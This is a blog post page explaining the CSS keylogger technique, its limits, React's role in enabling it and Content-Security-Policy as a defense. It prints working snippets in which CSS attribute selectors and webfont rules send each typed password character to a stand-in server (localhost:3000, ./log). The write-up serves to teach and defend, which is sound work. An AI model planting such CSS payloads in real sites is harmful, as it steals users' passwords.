<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>CSS keylogger: Attack and Defense - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2018/03/12/en/css-keylogger/" rel="alternate" hreflang="en" />


<link href="https://blog.huli.tw/2018/03/12/css-keylogger/" rel="alternate" hreflang="x-default" />


            
<link href="https://blog.huli.tw/2018/03/12/css-keylogger/" rel="alternate" hreflang="zh-TW" />
            





    
<link rel="canonical" href="https://blog.huli.tw/2018/03/12/en/css-keylogger/">
    





    <meta name="description" content="Introduction I recently came across this article on Hacker News: Show HN: A CSS Keylogger, which opened my eyes and inspired me to study it in depth and write an article to share with everyone. This a">
<meta property="og:type" content="article">
<meta property="og:title" content="CSS keylogger: Attack and Defense">
<meta property="og:url" content="https://blog.huli.tw/2018/03/12/en/css-keylogger/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="Introduction I recently came across this article on Hacker News: Show HN: A CSS Keylogger, which opened my eyes and inspired me to study it in depth and write an article to share with everyone. This a">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2018-03-12T13:10:00.000Z">
<meta property="article:modified_time" content="2025-02-28T13:04:48.066Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Front-end">
<meta property="article:tag" content="CSS">
<meta name="twitter:card" content="summary_large_image">



<link rel="alternative" href="/atom.xml" title="CSS keylogger: Attack and Defense" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#introduction">1&nbsp;&nbsp;<b>Introduction</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#what-is-a-keylogger">2&nbsp;&nbsp;<b>What is a Keylogger?</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#the-principle-of-pure-css-keylogger">3&nbsp;&nbsp;<b>The Principle of Pure CSS Keylogger</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#limitations-of-css-keylogger">4&nbsp;&nbsp;<b>Limitations of CSS Keylogger</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#order-cannot-be-guaranteed">4.1&nbsp;&nbsp;Order cannot be guaranteed</a>
                    
                    
                    
                    <a class="navbar-item" href="#duplicate-characters-will-not-send-requests">4.2&nbsp;&nbsp;Duplicate characters will not send requests</a>
                    
                    
                    
                    <a class="navbar-item" href="#the-value-does-not-change-when-typing">4.3&nbsp;&nbsp;The value does not change when typing</a>
                    
                    
                    
                    <a class="navbar-item" href="#reacts-response">4.4&nbsp;&nbsp;React’s response</a>
                    
                    
                    
                    <a class="navbar-item" href="#defense-methods">4.5&nbsp;&nbsp;Defense methods</a>
                    
                    
                    
                    <a class="navbar-item" href="#summary">4.6&nbsp;&nbsp;Summary</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#references">5&nbsp;&nbsp;<b>References</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2018/03/12/css-keylogger/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            CSS keylogger: Attack and Defense
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2018-03-12T13:10:00.000Z" itemprop="datePublished">12 March 2018</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Front-end/">Front-end</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h1><span id="introduction">Introduction</span></h1>
<p>I recently came across this article on Hacker News: <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=16422696">Show HN: A CSS Keylogger</a>, which opened my eyes and inspired me to study it in depth and write an article to share with everyone.</p>
<p>This article will cover the following topics:</p>
<ol>
<li>What is a keylogger</li>
<li>The principle of CSS keylogger</li>
<li>CSS keylogger and React</li>
<li>Defense methods</li>
</ol>
<p>Alright, let’s get started!</p>
<span id="more"></span>
<h1><span id="what-is-a-keylogger">What is a Keylogger?</span></h1>
<p>A keylogger is a type of malicious program that records every keystroke you make on your computer. I remember when I was young, I wrote a super simple keylogger using VB6, which just called the system’s API and recorded the corresponding keystrokes.</p>
<p>If this is installed on your computer, everything you type will be recorded, including your account and password. However, if I remember correctly, behavior detection by antivirus software should be able to block these, so there is no need to worry too much.</p>
<p>What if we limit ourselves to web pages?</p>
<p>If you want to add a keylogger to a page, you usually use JavaScript to achieve it, and the code is super simple:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'keydown'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>key<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Just detect the <code>keydown</code> event and capture the pressed key.</p>
<p>However, if you have the ability to insert malicious JavaScript into the web page you want to invade, you usually don’t need to go to the trouble of recording every keystroke. You can just steal cookies, tamper with pages, redirect to phishing pages, or return account and password to your own server when submitting. Therefore, keyloggers are not so useful.</p>
<p>So, assuming we can’t insert malicious JavaScript now and can only modify CSS, can we use pure CSS to create a keylogger?</p>
<p>Yes, after all, CSS can do <a target="_blank" rel="noopener" href="https://github.com/you-dont-need/You-Dont-Need-JavaScript">a lot of things</a>.</p>
<h1><span id="the-principle-of-pure-css-keylogger">The Principle of Pure CSS Keylogger</span></h1>
<p>You’ll understand it by looking at the code directly (taken from: <a target="_blank" rel="noopener" href="https://github.com/maxchehab/CSS-Keylogging">maxchehab/CSS-Keylogging</a>):</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[type="password"][value$="a"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/a"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Amazing, isn’t it?</p>
<p>If you’re not familiar with CSS selectors, let me review them for you. The above means that if the type is password and the value ends with <code>a</code>, the background image will load <code>http://localhost:3000/a</code>.</p>
<p>Now we can modify this CSS, add uppercase and lowercase letters, numbers, and even special characters. What will happen next?</p>
<p>If I enter <code>abc123</code>, the browser will send requests to:</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://localhost:3000/a">http://localhost:3000/a</a></li>
<li><a target="_blank" rel="noopener" href="http://localhost:3000/b">http://localhost:3000/b</a></li>
<li><a target="_blank" rel="noopener" href="http://localhost:3000/c">http://localhost:3000/c</a></li>
<li><a target="_blank" rel="noopener" href="http://localhost:3000/1">http://localhost:3000/1</a></li>
<li><a target="_blank" rel="noopener" href="http://localhost:3000/2">http://localhost:3000/2</a></li>
<li><a target="_blank" rel="noopener" href="http://localhost:3000/3">http://localhost:3000/3</a></li>
</ol>
<p>That’s it, your password is completely in the hands of the attacker.</p>
<p>This is the principle of CSS keylogger, using CSS selectors to load different URLs, you can send each character of the password to the server.</p>
<p>It looks scary, but don’t worry, it’s not that easy.</p>
<h1><span id="limitations-of-css-keylogger">Limitations of CSS Keylogger</span></h1>
<h2><span id="order-cannot-be-guaranteed">Order cannot be guaranteed</span></h2>
<p>Although you enter in order, the order cannot be guaranteed when the request arrives at the backend, so sometimes the order will be messed up. For example, <code>abc123</code> becomes <code>bca213</code> or something.</p>
<p>But if we modify the CSS selector, we can solve this problem:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^="a"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/a_"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
  
<span class="token selector">input[value*="aa"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/aa"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
  
<span class="token selector">input[value*="ab"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"http://localhost:3000/ab"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>If the beginning is <code>a</code>, we send out <code>a_</code>, and then send out a request for every two characters of the permutation and combination of 26 letters and numbers. For example, <code>abc123</code> will be:</p>
<ol>
<li>a_</li>
<li>ab</li>
<li>bc</li>
<li>c1</li>
<li>12</li>
<li>23</li>
</ol>
<p>Even if the order is messed up, you can reassemble the letters through this relationship and still get the correct password order.</p>
<h2><span id="duplicate-characters-will-not-send-requests">Duplicate characters will not send requests</span></h2>
<p>Because the loaded URLs are the same, duplicate characters will not load images and will not send new requests. This problem is currently unsolvable as far as I know.</p>
<h2><span id="the-value-does-not-change-when-typing">The value does not change when typing</span></h2>
<p>This is actually the biggest problem with CSS Keylogger.</p>
<p>When you enter information in an input field, the value of the input does not change. Therefore, the solutions mentioned above do not work. You can try it yourself and see that the content of the input changes, but if you check with dev tools, you will find that the value does not change at all.</p>
<p>There are two solutions to this problem. The first is to use Webfont:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>css keylogger<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?a<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+61<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?b<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+62<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?c<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+63<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">;</span> <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./log?d<span class="token punctuation">)</span></span><span class="token punctuation">,</span> <span class="token function">local</span><span class="token punctuation">(</span>Impact<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+64<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token selector">input</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> x<span class="token punctuation">,</span> <span class="token string">'Comic sans ms'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>type `bcd` and watch network log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(Code taken from: <a target="_blank" rel="noopener" href="https://github.com/jbtronics/CrookedStyleSheets/issues/24">Keylogger using webfont with single character unicode-range</a>)</p>
<p>If the value does not change, so what? The font will still be used! Every time you type a character, the corresponding request will be sent.</p>
<p>However, this method has two limitations:</p>
<ol>
<li>The order cannot be guaranteed, and the problem of duplicate characters cannot be solved.</li>
<li>It does not work if the field is <code>&lt;input type='password' /&gt;</code>.</li>
</ol>
<p>(When researching the second limitation, I discovered an interesting thing. Since Chrome and Firefox will mark websites with type ‘password’ input but without HTTPS as insecure, someone has developed a way to use <a target="_blank" rel="noopener" href="https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/">ordinary input with special fonts</a> to bypass this detection and make the input box look like a password (but the type is not password). In this case, Webfont can be used for attack.)</p>
<p>Now let’s look at the second solution. As mentioned earlier, the crux of this problem is that the value does not change. In other words, if the value changes when you enter input, this attack method will be very useful.</p>
<p>Hmm… does it feel familiar?</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">NameForm</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  
    <span class="token keyword">this</span><span class="token punctuation">.</span>handleChange <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleChange</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token function">handleChange</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">value</span><span class="token operator">:</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
      <span class="token operator">&lt;</span>form<span class="token operator">></span>
        <span class="token operator">&lt;</span>label<span class="token operator">></span>
          <span class="token literal-property property">Name</span><span class="token operator">:</span>
          <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span> onChange<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChange<span class="token punctuation">&#125;</span> <span class="token operator">/</span><span class="token operator">></span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(The above code is adapted from <a target="_blank" rel="noopener" href="https://reactjs.org/docs/forms.html">React official website</a>)</p>
<p>If you have used React, you should be familiar with this pattern. When you enter anything, the state is changed first, and then the value of the state is mapped to the value of the input. Therefore, whatever you enter, the value will be the same.</p>
<p>React is a super popular front-end library. It can be imagined that a lot of websites are made with React, and as long as it is React, it can almost guarantee that the value of the input will always be synchronized (almost, but there are still a few that do not follow this rule).</p>
<p>To summarize, as long as the value of your input corresponds to the value inside (if you use React, you will almost certainly write it this way), and there is a place for others to insert custom CSS, CSS Keylogger can be successfully implemented. Although there are some flaws (cannot detect duplicate characters), the concept is feasible, but the accuracy is not that high.</p>
<h2><span id="reacts-response">React’s response</span></h2>
<p>The React community has also discussed this issue in <a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/11896">Stop syncing value attribute for controlled inputs #11896</a>.</p>
<p>In fact, there have always been some bugs in synchronizing the value of the input, and even the well-known traffic analysis website Mixpanel has accidentally recorded sensitive information in the past, and the root cause is that React keeps synchronizing the value.</p>
<p>The discussion in the issue is worth reading. It mentions something that everyone often confuses: Input attributes and properties. I found a good explanation on Stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6003819/what-is-the-difference-between-properties-and-attributes-in-html">What is the difference between properties and attributes in HTML?</a></p>
<p>Attributes are basically what you have in your HTML, while properties represent the actual value. The two may not be equal. For example:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>the-input<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Name:<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>If you grab the attribute of this input today, you will get <code>Name:</code>, but if you grab the value of the input today, you will get the value currently in the input box. So this attribute is actually the same as the <code>defaultValue</code> we often use, which is the default value.</p>
<p>However, in React, it synchronizes the attribute with the value, so whatever your value is, the attribute will be the same.</p>
<p>From the discussion, it seems that in React 17, there is a good chance that this mechanism will be removed so that these two will no longer be synchronized.</p>
<h2><span id="defense-methods">Defense methods</span></h2>
<p>After talking so much above, because React has not changed this yet, the problem still exists. And in fact, besides React, other libraries may have done similar things.</p>
<p>I won’t mention the client-side defense methods here. Basically, it’s to install some Chrome extensions written by others, which can help you detect CSS that matches the pattern. What’s more worth mentioning here is the defense on the server-side.</p>
<p>Currently, the most permanent solution seems to be Content-Security-Policy. In short, it is an HTTP Response header that determines which resources the browser can load, such as prohibiting inline code and only allowing resources under the same domain to be loaded.</p>
<p>The original intention of this header is to prevent XSS and attackers from loading external malicious code (such as our CSS keylogger). If you want to know more about how to use it, you can refer to this article: <a target="_blank" rel="noopener" href="https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/">Content-Security-Policy - HTTP Headers Security Issues (2)</a></p>
<h2><span id="summary">Summary</span></h2>
<p>I have to say, this technique is really interesting! When I first saw it, I was amazed for a while that I could find such a pure CSS keylogger. Although it is technically feasible, there are still many difficulties in implementation, and many prerequisites must be met to do such an attack. However, it is still worth paying attention to the follow-up development.</p>
<p>In short, this article is to introduce this thing to readers, hoping that everyone will gain something.</p>
<h1><span id="references">References</span></h1>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/jbtronics/CrookedStyleSheets/issues/24">Keylogger using webfont with single character unicode-range #24</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/11896">Stop syncing value attribute for controlled inputs #11896</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/maxchehab/CSS-Keylogging">maxchehab/CSS-Keylogging</a></li>
<li><a target="_blank" rel="noopener" href="https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/">Content-Security-Policy - HTTP Headers Security Issues (2)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/">Bypassing Browser Security Warnings with Pseudo Password Fields</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/">CSS Keylogger (and why you shouldn’t worry about it)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.reddit.com/r/analytics/comments/7ukw4n/mixpanel_js_library_has_been_harvesting_passwords/">Mixpanel JS library has been harvesting passwords </a></li>
</ol>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Front-end/">#Front-end</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/CSS/">#CSS</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2018/03/31/en/react-fiber-and-lifecycles/">A Brief Introduction to React Fiber and Its Impact on Lifecycles</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2018/02/03/en/github-classroom-and-travis-ci/">Using Github Classroom and Travis CI to Build a Homework Submission System</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2018/03/12/css-keylogger/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
